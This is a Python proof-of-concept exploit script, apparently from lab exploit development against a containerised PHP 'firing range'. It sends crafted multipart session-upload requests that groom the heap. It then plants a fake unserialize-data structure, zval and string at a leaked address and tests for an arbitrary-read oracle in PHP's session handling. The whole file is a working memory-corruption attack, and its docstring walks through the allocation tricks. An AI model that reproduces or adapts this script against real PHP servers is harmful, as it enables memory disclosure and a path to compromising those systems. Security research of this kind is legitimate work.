#!/usr/bin/env python3
"""smb_oracle7.py — v7: fake-d AT d via a single-read 5000B value + 6-byte session.

Placement (all gdb-verified laws):
  - value 5000B => multipart_buffer_read_body does ONE read =>
    buf1 = emalloc(5001) = 2 PAGES => best-fit splits d's freed 3-page run:
    buf1 = d+0x0..0x2000 (our fake php_unserialize_data at d+0!)
  - the estrndup copy (5019 => 2 pages) lands elsewhere (d has only 1
    page left); buf1 freed at register => d+0..0x2000 free-but-OURS
  - the remaining 1 page (d+0x2000) absorbs the FILE part's bin pages
  - the 6-byte session `k|R:3;` allocates in the established 32-bin
    (never a new page) => d's header never touched
The fake-d: last=&entries, first/last_dtor=prebuilt dtor (used_slots=0,
no fresh emalloc), entries.used_slots=15, data[2]->our fake zval at
d+0x400 -> fake zend_string "ORACLEWORKS!!!" at d+0x440.
R:3 => k = our string => flush writeback echoes it (ARBITRARY READ once
the fake string points at TARGET-0x18 with len=*(TARGET-0x10+8)...).
"""
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle2 as o2
from smb_oracle import stage, fire_main

BND = b"G"


def part(name, value):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"\r\n\r\n' + value + b"\r\n")


def file_part(name, value, filename=b"a.txt"):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name
            + b'"; filename="' + filename + b'"'
            b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")


def fake_d(gaddr):
    """5000B fake php_unserialize_data at gaddr (=d)."""
    b = bytearray(5000)
    struct.pack_into("<Q", b, 0x00, gaddr + 0x38)     # last = &entries
    struct.pack_into("<Q", b, 0x08, gaddr + 0x800)   # first_dtor = prebuilt
    struct.pack_into("<Q", b, 0x10, gaddr + 0x800)   # last_dtor  = prebuilt
    struct.pack_into("<Q", b, 0x30, 0x1000)         # max_depth
    struct.pack_into("<Q", b, 0x38, 15)               # entries.used_slots
    struct.pack_into("<Q", b, 0x40, 0)                # entries.next
    struct.pack_into("<Q", b, 0x48 + 2 * 8, gaddr + 0x400)  # data[2] -> zval
    # prebuilt var_dtor_entries @ +0x800
    struct.pack_into("<Q", b, 0x800, 0)               # used_slots
    struct.pack_into("<Q", b, 0x808, 0)               # next
    # fake zval @ +0x400: {value -> fake string, IS_STRING_EX}
    struct.pack_into("<Q", b, 0x400, gaddr + 0x440)
    struct.pack_into("<I", b, 0x408, 0x106)
    # fake zend_string @ +0x440
    struct.pack_into("<I", b, 0x440, 100)             # refcount
    struct.pack_into("<I", b, 0x444, 6)              # gc type
    struct.pack_into("<Q", b, 0x450, 16)             # len
    b[0x458:0x458 + 16] = b"ORACLEWORKS!!!\x00"
    return bytes(b)


def build_body(gsid, gaddr):
    g = fake_d(gaddr)
    return (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part(b"f", b"z" * 4096) +
            b"--" + BND + b"--\r\n")


def main():
    print("=== ORACLE v7: fake-d at d + tiny session ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"o7{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    d = o2.find_bg()
    print(f"d = {hex(d) if d else None}")
    if not d:
        return 1
    gsid = f"o7c{int(time.time())}"
    stage(gsid, b"k|R:3;")
    first = fire_main(build_body(gsid, d))
    print(f"consumer: {first}")
    rc, out = q.docker_exec(q.CT["vuln"], f"head -c 200 /tmp/sess_{gsid} 2>/dev/null")
    print(f"sess: {out[:160]!r}")
    hit = "ORACLEWORKS!!!" in out
    print(f"*** ARBITRARY-READ ORACLE {'LIVE!!!' if hit else 'not yet'} ***")
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
